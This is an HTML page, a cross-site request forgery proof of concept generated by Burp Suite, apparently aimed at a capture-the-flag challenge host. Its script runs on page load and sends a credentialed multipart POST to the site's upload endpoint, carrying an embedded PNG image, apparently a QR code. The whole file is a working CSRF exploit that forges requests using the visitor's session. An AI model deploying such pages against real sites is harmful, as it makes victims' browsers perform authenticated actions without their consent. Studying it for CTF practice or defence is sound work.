<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
    <script>
      function submitRequest() {
        var xhr = new XMLHttpRequest();
        xhr.open("POST", "http://ctf.widyasecurity.com/upload", true);
        xhr.setRequestHeader("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8");
        xhr.setRequestHeader("Accept-Language", "en-US,en;q=0.5");
        xhr.setRequestHeader("Content-Type", "multipart/form-data; boundary=---------------------------2126864338716021707764136795");
        xhr.withCredentials = true;
        var body = "-----------------------------2126864338716021707764136795\r\n" + 
          "Content-Disposition: form-data; name=\"qrcode\"; filename=\"api.qrserver.png\"\r\n" + 
          "Content-Type: image/png\r\n" + 
          "\r\n" + 
          "\x89PNG\r\n" + 
          "\x1a\n" + 
          "\x00\x00\x00\rIHDR\x00\x00\x00\xfa\x00\x00\x00\xfa\x01\x03\x00\x00\x00\xb2\"\xc8~\x00\x00\x00\x06PLTE\xff\xff\xff\x00\x00\x00U\xc2\xd3~\x00\x00\x00\tpHYs\x00\x00\x0e\xc4\x00\x00\x0e\xc4\x01\x95+\x0e\x1b\x00\x00\x01\xbeIDATh\x81\xed\x99=\x8e\x83@\x0c\x85\x8d((9\x02G\xe1h\xe1h\x1c\x85#PN\x81\xf0\xce{\xf6\xb0\xb0\xcajS\xaf\xed\"R&_\xf5\xe4\xe7\xbf\x88\xfc\x15/e\xec\"\xfd\xd9\xa9\xda\xc3.\x83=\xeb\x12\x06X\xa0\xc6\xb8\x0f\xa5?M\x97u\xdeD\x86B\x95\x12\xb8\x01\xb3\xea6\xee\xf8\xda)^d\xde\xc8\xab\x9e\x01\x81\x9aB\xc8\xa8\xfa2\xaf\x92\xc0\xef\x80\x0c\x87\x97\x9c\xb5\x3eD\x04\xdcYz\xa0\x02U\xa9V\x3c\xbc\xb1^t\xc0k5J\x10\xadW\x95\xb4\x04\xfbQ\xcc\xff9p\x05\xac%\x06\xe8.o\"8@%\xb7\xb1~ \xa3jsg\t\xd22\x1cT6\x0c`\x04\x94\xb9\r9\x8a\x8c:j\x0fCF%\xd0\xb9\xb3\xeaPS\x954\xeb\xe1\xf7\xa6\xa4\x9e\x9eT\t4`\xb2!\xc8\xad\'\xc6\x9b\x13\xa3\x00\x10f\xf2\x85\xa16s\xb3\x1e\xa37\'&`\x00\xa7\x1e\xa4T\x81\xd3\xd4j5\x03S\x11\xbd\x19\x02\xc0\xda\xc4\xef\xde\xdc\x11t\xda\xc1\x0c\x93\x04\x1e\xc0\x3e\x9666#\xb0v}[/\x08P\x9d\xb5\xb1\xf6\"\x83\xb0N\xac\xa8H\x03\x85J\xe0\x0e0\x85\n" + 
          "\xa5C\xd3Ze\xb2\xe6n\xebg\x14`\xa1\xb1\xae\xbd\x9bm\x0c\x05\xa9W\x1f\x17\x13h@\xcd(\xf8\xed\xda\xb3@\xdc\xe6\xea\x04.\xc0\x17sX\xcf/9,\xd9\xd7\x89#\x02\xd0b(\x3e\r\xcal\x97\xc0\xbeu\xff\x04\x9e\x87\x1am\xb5ZX\xa3J\x8f=K$\x0c@\xad\xec\xf4\xd7\xf9EkRk\xee\t\x3c\x80\xd9o\xc5lb\xaa\xb6oz\x04\x04J\x9b\x82y\xfa\x13\x94\xe2\xc7\x9f,\t4%\xd9\xdc\xdfY/\x08`\xcej7\xf3\xe5\xe5\xce\x12I\xe0\x01\xb4Z\xcd\x7f\x13\xbc\xb9\xdb\x90\xa3\xbeo& \x1f\xc4\x17l\x9f*\xfbm\xe5\xf2\x1d\x00\x00\x00\x00IEND\xaeB`\x82\r\n" + 
          "-----------------------------2126864338716021707764136795--\r\n";
        var aBody = new Uint8Array(body.length);
        for (var i = 0; i < aBody.length; i++)
          aBody[i] = body.charCodeAt(i); 
        xhr.send(new Blob([aBody]));
      }
      submitRequest();
    </script>
    <form action="#">
      <input type="button" value="Submit request" onclick="submitRequest();" />
    </form>
  </body>
</html>
